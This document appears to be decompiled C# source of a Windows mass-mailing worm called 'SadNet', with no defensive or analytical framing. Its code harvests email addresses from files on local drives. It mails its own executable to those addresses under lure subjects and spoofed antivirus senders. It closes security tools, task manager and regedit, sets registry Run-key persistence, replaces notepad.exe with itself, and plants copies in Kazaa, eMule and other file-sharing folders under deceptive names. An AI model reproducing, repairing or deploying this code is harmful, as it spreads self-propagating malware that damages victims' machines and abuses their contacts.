using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Mail;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SadNet;

public class Form1 : Form
{
	private IContainer components;

	private Timer mailer;

	private Timer killer;

	public Form1()
	{
		InitializeComponent();
	}

	private void mailer_Tick(object sender, EventArgs e)
	{
		//IL_044e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0455: Expected O, but got Unknown
		//IL_04a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b1: Expected O, but got Unknown
		try
		{
			string[] array = new string[20]
			{
				"mcafee", "symantec", "Yahoo!", "Thank you!", "Text message", "Document", "Incoming Message ", "Message Notify ", "Fax Message", "Protected message",
				"panda", "Encrypted document", "Account notify", "E-mail account disabling warning", "E-mail technical support message.", "E-mail warning", "Email account utilization warning.", "Fax Message Received ", "Forum notify ", "do you know AmirCivil?"
			};
			Random random = new Random();
			int num = random.Next(0, 20);
			string subject = array[num];
			string[] array2 = new string[5] { "AmirCivil.pic.cmd", "register.pif ", "sexy-screensaver.scr ", "fullmessenger.exe", "readme.html.cmd" };
			Random random2 = new Random();
			random2.Next(0, 5);
			string[] array3 = new string[20]
			{
				"Deliver Error", "Message Error", "help attached ", "such as yours", "illegal st. of you?", "is that your name? ", "picture? ", "abuse? ", "is that yours? ", "I have your password! ",
				"classroom test of you? ", "old photos about you? ", "i hope thats not true! ", "does it match? ", " you know amir_civil?!", "why should I? ", "another pic, have fun! ... :->", "xxx ? ", "the information is wrong! ", "love letter? "
			};
			Random random3 = new Random();
			int num2 = random3.Next(0, 20);
			string body = array3[num2];
			string[] array4 = new string[2] { "*txt", "*html" };
			Random random4 = new Random();
			int num3 = random4.Next(0, 2);
			string searchPattern = array4[num3];
			string[] array5 = new string[20]
			{
				"mcafee@yahoo.com", "symantec@yahoo.com", "nod32@yahoo.com", "panda@yahoo.com", "avg@yahoo.com", "antiblaster@yahoo.com", "info@yahoo.com", "ebook@yahoo.com", "LongShot@yahoo.com", "iraq@yahoo.com",
				"update@yahoo.com", "matt@yahoo.com", "steve@yahoo.com", "smith@yahoo.com", "stan@yahoo.com", "bill@yahoo.com", "bob@yahoo.com", "YourFriend@yahoo.com", " mail@yahoo.com", "ted@yahoo.com"
			};
			Random random5 = new Random();
			int num4 = random5.Next(0, 20);
			string from = array5[num4];
			string[] array6 = new string[5] { "C:\\", "D:\\", "E:\\", "G:\\", "F:\\" };
			Random random6 = new Random();
			int num5 = random6.Next(0, 5);
			string path = array6[num5];
			for (int i = 0; i < 10; i++)
			{
				try
				{
					string[] array7 = new string[3] { "C:\\dir1", "D:\\", "C:\\windows" };
					string[] array8 = array7;
					for (int j = 0; j < array8.Length; j++)
					{
						string[] files = Directory.GetFiles(path, searchPattern);
						string[] array9 = files;
						foreach (string path2 in array9)
						{
							Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+");
							FileStream fileStream = new FileStream(path2, FileMode.Open, FileAccess.Read);
							byte[] array10 = new byte[fileStream.Length];
							fileStream.Read(array10, 0, (int)fileStream.Length);
							fileStream.Close();
							foreach (Match item in regex.Matches(Encoding.ASCII.GetString(array10)))
							{
								string to = item.ToString();
								try
								{
									MailMessage val = new MailMessage();
									val.set_From(from);
									val.set_To(to);
									val.set_Cc("info@yahoo.com");
									val.set_Bcc("password@yahoo.com");
									val.set_Subject(subject);
									val.set_Body(body);
									SmtpMail.set_SmtpServer("mx4.mail.yahoo.com");
									val.get_Attachments().Add((object?)new MailAttachment(Application.get_ExecutablePath(), (MailEncoding)1));
									SmtpMail.Send(val);
								}
								catch (Exception)
								{
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void killer_Tick(object sender, EventArgs e)
	{
		string[] array = new string[56]
		{
			"NPROTECTED", "GhostTray", "NAVW32", "F-AGNT95", "NOD32", "NETD32", "NETMON", "IOMON98", "SCAN32", "NORMIST",
			"NAVW3", "ADAWARE", "AGENTW", "LU32", "NAVAP32", "ANTIVIR", "TCM", "W9X", "AVKSERV", "winamp",
			"ACKWIN32", "AD-AWARE", "ADVXDWIN", "AGENTSVR", "AGENTW", "ANTIVIRUS", "ANTS", "APIMONITOR", "APLICA32", "ARR",
			"AUPDATE", "AUTODOWN", "AUTOTRACE", "AVE32", "AVGCC32", "AVGCTRL", "AVGNT", "CFINET", "CLEANPC", "CTRL",
			"AV32", "DATEMANAGER ", "DOORS", "DPFSETUP ", "FCH32 ", "FNRB32", "notepad", "killer", "POP3TRAP", "remind",
			"cftmon", "msmsgs", "taskmgr", "regedit", "vb6", "ZONEALARM"
		};
		Random random = new Random();
		int num = random.Next(0, 56);
		string processName = array[num];
		Process[] processesByName = Process.GetProcessesByName(processName);
		Process[] array2 = processesByName;
		foreach (Process process in array2)
		{
			process.CloseMainWindow();
		}
	}

	private void hidden_Tick(object sender, EventArgs e)
	{
	}

	private void error_Tick(object sender, EventArgs e)
	{
	}

	private void copy_Tick(object sender, EventArgs e)
	{
	}

	private void amir(object sender, EventArgs e)
	{
		((Control)this).Hide();
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\winlogon.cab.exe");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SadNet", Environment.SystemDirectory + "\\winlogon.cab.exe", RegistryValueKind.ExpandString);
			Registry.SetValue("HKEY_CURRENT_USER\\SadNet", "SadNet", "(_-oO]xX|-|S|-|a|-|d|-|N|-|e|-|t|-|Xx[Oo-_)!", RegistryValueKind.ExpandString);
		}
		catch (Exception)
		{
		}
		try
		{
			string sourceFileName = Environment.SystemDirectory + "\\notepad.exe";
			string destFileName = Environment.SystemDirectory + "\\AmirCivil.exe";
			File.Move(sourceFileName, destFileName);
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\notepad.exe");
		}
		catch (Exception)
		{
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\symantec.exe");
			File.Copy(Application.get_ExecutablePath(), "D:\\fun.pic.scr");
			File.Copy(Application.get_ExecutablePath(), "E:\\wow.pif");
			File.Copy(Application.get_ExecutablePath(), "F:\\mail.cmd");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\eMule\\Incoming\\symantec.cmd");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\eMule\\Incoming\\symantec.cmd");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Kazaa\\My Shared Folder\\winampa2.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\eMule\\Incoming\\symantec.cmd");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Kazaa\\My Shared Folder\\project.exe");
			File.Copy(Application.get_ExecutablePath(), "J:\\Program Files\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Kazaa\\My Shared Folder\\screen_saver!.scr");
			File.Copy(Application.get_ExecutablePath(), "F:\\Program Files\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
			File.Copy(Application.get_ExecutablePath(), "H:\\Program Files\\Kazaa\\My Shared Folder\\fun.pic.scr");
		}
		catch (Exception)
		{
		}
		try
		{
			api.ShowWindow(api.FindWindowA("ConsoleWindowClass", null), 0);
			api.ShowWindow(api.FindWindowA("#32770", null), 0);
			api.ShowWindow(api.FindWindowA("MGHTML_DLG_CLASS", null), 0);
			api.ShowWindow(api.FindWindowA("NAVAP Wnd Clas", null), 0);
			api.ShowWindow(api.FindWindowA("RegEdit_RegEdit", null), 0);
			api.ShowWindow(api.FindWindowA("notepad", null), 0);
		}
		catch (Exception)
		{
		}
	}

	private void hien_Tick(object sender, EventArgs e)
	{
	}

	private void mail2_Tick(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		mailer = new Timer(components);
		killer = new Timer(components);
		((Control)this).SuspendLayout();
		mailer.set_Enabled(true);
		mailer.set_Interval(30000);
		mailer.add_Tick((EventHandler)mailer_Tick);
		killer.set_Enabled(true);
		killer.add_Tick((EventHandler)killer_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 266));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("SadNet");
		((Form)this).add_Activated((EventHandler)amir);
		((Control)this).ResumeLayout(false);
	}
}
